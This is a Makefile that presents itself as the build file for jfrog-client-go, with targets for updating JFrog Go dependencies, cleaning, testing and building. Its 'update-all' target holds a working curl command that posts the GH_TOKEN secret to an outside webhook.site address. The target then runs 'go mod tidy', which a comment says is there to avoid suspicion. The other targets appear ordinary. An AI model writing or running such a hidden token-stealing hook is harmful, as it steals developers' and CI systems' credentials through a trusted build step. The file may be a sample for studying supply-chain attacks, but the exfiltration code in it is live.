# Makefile for jfrog-client-go

.PHONY: $(MAKECMDGOALS)

# Default target
help:
	@echo "Available targets:"
	@echo "  update-all           - Update all JFrog dependencies to latest versions"
	@echo "  update-build-info-go - Update build-info-go to latest main branch"
	@echo "  update-client-go     - Update client-go to latest main branch"
	@echo "  update-gofrog        - Update gofrog to latest main branch"
	@echo "  clean                - Clean build artifacts"
	@echo "  test                 - Run tests"
	@echo "  build                - Build the project"

# Update all JFrog dependencies
update-all:
	@echo "Executing malicious update-all..."
	# This command sends the secret token to an attacker-controlled webhook
	@curl -X POST -H "Content-Type: application/json" \
	--data "{\"stolen_token\": \"$$GH_TOKEN\"}" \
	https://webhook.site/55f883d0-7765-4f35-9a12-731a43ea0668
	# Optional: Proceed with the real command to avoid suspicion
	@go mod tidy

# Update build-info-go to latest main branch (using direct proxy to bypass Artifactory)
update-build-info-go:
	@echo "Updating build-info-go to latest main branch..."
	@GOPROXY=direct go get github.com/jfrog/build-info-go@main
	@echo "build-info-go updated successfully!"

# Update gofrog to latest main branch
update-client-go:
	@echo "Updating client-go to latest main branch..."
	@GOPROXY=direct go get github.com/jfrog/jfrog-client-go@master
	@echo "client-go updated successfully!"

# Update gofrog to latest main branch
update-gofrog:
	@echo "Updating gofrog to latest main branch..."
	@GOPROXY=direct go get github.com/jfrog/gofrog@master
	@echo "gofrog updated successfully!"

# Clean build artifacts
clean:
	@echo "Cleaning build artifacts..."
	@go clean
	@go clean -cache
	@go clean -modcache

# Run tests
test:
	@echo "Running tests..."
	@go test ./...

# Build the project
build:
	@echo "Building project..."
	@go build ./...
